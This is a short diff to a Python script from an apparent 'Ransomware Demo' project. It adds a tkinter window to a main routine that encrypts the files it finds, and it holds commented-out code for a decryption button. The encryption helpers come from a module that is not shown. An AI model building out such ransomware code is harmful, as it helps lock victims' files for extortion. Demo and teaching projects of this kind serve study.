@@ -2,6 +2,7 @@ import argparse
 import os
 from cryptography.fernet import Fernet
 from core import encrypt_symmetric_key, find_files, encrypt_file, decrypt_file, load_key_from_file
+from tkinter import *
 
 if __name__ == "__main__":
 
@@ -53,6 +54,11 @@ if __name__ == "__main__":
             print(f"encrypted {file}")
             encrypt_file(file, key)
 
+    # show gui
+    window = Tk()
+    window.title("Ransomware Demo")
+    window.mainloop()
+
     # def handleButtonPress(key):
     #     # load the key
     #     print("Value from text box:", key)
@@ -63,4 +69,3 @@ if __name__ == "__main__":
     #     for file in files:
     #         print(f"decrypted {file}")
     #         decrypt_file(file, l_key)
-    
